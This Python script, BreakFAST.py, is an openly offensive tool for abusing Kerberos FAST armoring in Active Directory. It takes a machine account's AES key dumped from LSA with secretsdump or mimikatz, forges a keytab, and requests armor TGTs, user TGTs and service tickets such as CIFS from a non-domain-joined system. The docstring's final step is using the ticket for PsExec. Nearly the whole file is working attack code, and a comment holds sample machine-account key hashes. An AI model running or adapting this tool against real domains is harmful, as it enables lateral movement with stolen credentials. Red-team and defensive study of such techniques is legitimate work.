"""
Usage: 
------
    
    ./BreakFAST.py -etype <int> -ekey <key> -machine <machine> [-outfile <.ccache>] [-spn <SPN>] identity

Details:
--------

    This tool demonstrates how to abuse Kerberos FAST armoring. When enabled, the KDC doesnt
    force FAST armoring on machine account AS-REQ. Thus, it is possible to request an armor
    TGT for a given machine principal if the associated long term secret (aesKey) is known. 
    This armor TGT can then be used for armoring TGS-REQ, e.g. CIFS\someHost to get a session 
    from a non domain-joined system, as demonstrated in this tool.  

Prerequisites:
--------------

    BreakFAST takes -aesKey as input, which is obtained by dumping LSA on the armorPrincipal system
    (or the Domain Controller, less likely). You must also know the password or other credential for 
    the user account you wish to impersonate. This script only helps you forge RFC-Compliant FAST.

References:
-----------

    Recover AES-Key:
        https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

    FAST Armoring : 
        https://www.rfc-editor.org/rfc/rfc6113.txt

    Krb5 FAST: 
        https://github.com/jborean93/krb5-fast

    SecretsToKeytab:
        https://github.com/DovidP/generate-keytab/tree/master


Overview:
---------

    1. Convert aesKey to keytab (can be obtained running secretsdump)                    
    2. Build FAST AS-REQ using keytab as armor key, receive machine$ TGT                        
    3. Build FAST AS-REQ for user using machine$ TGT as armor key, receive user TGT
    4. Build FAST TGS-REQ using machine$ TGT for CIFS\fqdn, receive FAST ST for user
    5. Use ST for PsExec    
        
"""

import struct
from time import time
from dataclasses import astuple, dataclass
import argparse
import sys
import tempfile

from impacket.examples.utils import parse_identity 

import copy
import krb5
import gssapi
import gssapi.raw

# Ex etypes and ekeys:
# WIN-D7FNC0765NG$:aes256-cts-hmac-sha1-96:7e1cf276579d969397ca3f2a6b0fa990c1450329d12a52331d6cdf76d35820c9
# WIN-D7FNC0765NG$:aes128-cts-hmac-sha1-96:7a7d3903abbb62169b01fd38872dfe9b
# WIN-D7FNC0765NG$:des-cbc-md5:b61f4f682a9e4386

etypes = {
    'des-cbc-crc': 1, 
    'des-cbc-md4': 2, 
    'des-cbc-md5': 3,
    'des3-cbc-md5': 5,
    'des3-cbc-sha1': 7,
    'dsaWithSHA1-CmsOID': 9,
    'md5WithRSAEncryption-CmsOID': 10,
    'sha1WithRSAEncryption-CmsOID': 11,
    'rc2CBC-EnvOID': 12,
    'rsaEncryption-EnvOID': 13,
    'rsaES-OAEP-ENV-OID': 14,
    'des-ede3-cbc-Env-OID': 15,
    'des3-cbc-sha1-kd': 16,
    'aes128-cts-hmac-sha1-96': 17, 
    'aes256-cts-hmac-sha1-96': 18,
    'aes128-cts-hmac-sha256-128': 19, 
    'aes256-cts-hmac-sha384-192': 20,
    'rc4-hmac': 23,
    'rc4-hmac-exp': 24,
    'camellia128-cts-cmac': 25,
    'camellia256-cts-cmac': 26
}

def data_bytes(data):
    return struct.pack(f'>h{len(data)}s', len(data), bytes(data, 'ascii'))

@dataclass
class Principal:
    count_of_components: int = 1
    realm: bytes = None
    component: bytes = None
    name_type: int = 1

    def packed(self):
        return struct.pack(f'>h{len(self.realm)}s{len(self.component)}sl', *astuple(self))

@dataclass
class Entry:
    principal: bytes = None
    timestamp: int = int(time())
    key_version1: int = 1
    enctype: int = None
    key_length: int = None
    key_contents: bytes = None
    key_version2: int = 1

    def packed(self):
        packed_entry = struct.pack(f'>{len(self.principal)}sibhh{self.key_length}sl', *astuple(self))
        return struct.pack('>l{}s'.format(len(packed_entry)), len(packed_entry), packed_entry)


def ConvertKeyToKeyTab(machine, alg, key, realm):   
    if alg in etypes.values():
            etype = alg
    else:
        raise argparse.ArgumentTypeError(f"Invalid algorithm number: {alg}")    
    
    key = bytes.fromhex(key)
    principal = Principal(realm = data_bytes(realm), component = data_bytes(machine))
    entry = Entry()
    entry.principal = principal.packed()
    entry.enctype = etype
    entry.key_length = len(key)
    entry.key_contents = key
    version = b'\x05\x02'
    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.keytab') as f:
        f.write(version + entry.packed())
        fpath = f.name

    return fpath

def GetFASTArmor(realm, username, passw, keytab, outfile):

    ctx = krb5.init_context()
    
    armour_kt = krb5.kt_resolve(ctx, f"FILE:{keytab}".encode('utf-8'))
    armour_kt_entry = list(armour_kt)[0]
    armour_princ = copy.copy(armour_kt_entry.principal)
    
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    armour_cred = krb5.get_init_creds_keytab(ctx, armour_princ, init_opt, keytab=armour_kt)
    armour_cc = krb5.cc_new_unique(ctx, b"MEMORY")
    
    krb5.cc_initialize(ctx, armour_cc, armour_princ)
    krb5.cc_store_cred(ctx, armour_cc, armour_cred)
    
    s = username+"@"+realm.upper()
    princ = krb5.parse_name_flags(ctx, s.encode('utf-8'))
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    
    krb5.get_init_creds_opt_set_canonicalize(init_opt, True)
    krb5.get_init_creds_opt_set_fast_flags(ctx, init_opt, krb5.FastFlags.required)
    krb5.get_init_creds_opt_set_fast_ccache(ctx, init_opt, armour_cc)
    cred = krb5.get_init_creds_password(ctx, princ, init_opt, password=passw.encode('utf-8'))
    
    print('\n'+"---"*10)
    print(f"[*] FAST AS-REQ sent...")
    
    tgt = krb5.cc_resolve(ctx, f"FILE:{outfile}".encode())
    krb5.cc_initialize(ctx, tgt, princ)
    krb5.cc_store_cred(ctx, tgt, cred)
    
    print(f"[+] Saved TGT to {outfile}")
    return tgt


def GetFASTSt(realm, username, tgt, machine, spn, outfile):
    
    kerberos = gssapi.OID.from_int_seq("1.2.840.113554.1.2.2")
    s = username+"@"+realm.upper()
    kerb_user = gssapi.Name(s, name_type=gssapi.NameType.user)
    
    ccache_name = tgt.name or b""
    if tgt.cache_type:
        ccache_name = tgt.cache_type + b":" + ccache_name
    
    gssapi_cred = gssapi.raw.acquire_cred_from(
        {b"ccache": ccache_name},
        name=kerb_user,
        mechs=[kerberos],
        usage="initiate",
    ).creds
    
    cifs_ctx = gssapi.SecurityContext(
        creds=gssapi_cred,
        usage="initiate",
        name=gssapi.Name(spn, name_type=gssapi.NameType.hostbased_service),
        mech=kerberos,
    )
    print(f"[*] FAST TSG-REQ sent...")
    
    token = cifs_ctx.step()
    print(f"[+] Saved FAST ST for {spn} to {outfile}")


def main():

    # Usage: BreakFAST.py -etype <id> -ekey <key> -machine <machine> [-outfile <.ccache>] [-spn <SPN>] identity
    # -etype : Encryption algorithm, see list - pass as integer, defaults to AES 
    # -ekey : machine account key, retrieved using secretsdump or mimikatz
    # -machine: machine account the key belongs to, with $ at the end
    # [option] -outfile: name for .ccache where ticket will be saved
    # [option] -spn: service principal name, will trigger FAST TGS-REQ and .ccache will contain the ST
    # identity: identity for which TGT/TGS will be requested
    # Default : emit FAST AS-REQ for identity under machine, obtain TGT for this identity

    parser = argparse.ArgumentParser(description="BreakFAST - Forge FAST Armoring AS-REQ/TGS-REQs")
    parser.add_argument("-etype", help="Encryption algorithm id)", default=18)
    parser.add_argument("-ekey", help="Ekey for machine account, needs to match etype", required=True)
    parser.add_argument("-machine", help="machine account for armor TGT", required=True)
    parser.add_argument("-outfile", help=".ccache file to save TGT/ST")
    parser.add_argument("-spn", help="request a TGS for the given SPN")
    parser.add_argument('identity', help='REALM/username:password')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    key = args.ekey
    machine = args.machine
    alg = int(args.etype)

    if machine[-1] != "$":
        machine += "$"

    if args.outfile:
        outfile = args.outfile
    elif args.spn:
        outfile = 'ST_BreakFAST.ccache'
    else:
        outfile = 'TGT_BreakFAST.ccache'
    
    realm, username, password, _, _, _ = parse_identity(args.identity)
    keytab = ConvertKeyToKeyTab(machine, alg, key, realm)
    
    try: 
        tgt = GetFASTArmor(realm, username, password, keytab, outfile)

        if args.spn is not None:
            spn = args.spn

            try:
                GetFASTSt(realm, username, tgt, machine, spn, outfile) 
                print(f"[*] Use with: export KRB5CCNAME={outfile}")
            except:
                print(f"[!] TGS-REQ failed, check if {spn} exists ?")
        print("---"*10+'\n')

    except krb5._exceptions.Krb5Error as e:
        print('\n'+"---"*10)
        if "Pre-authentication failed" in str(e) and "No key table entry found" in str(e):
            print(f"[!] Error: eType not supported for {machine}@{realm}")
            print("[?] Try with etype=18 (aes256-cts-hmac-sha1-96) ?")
            
        else:
            print("[!] Pre-authentication failed. Check etype, ekey, and identity.")
        print("---"*10+'\n')

if __name__ == '__main__':
    main()
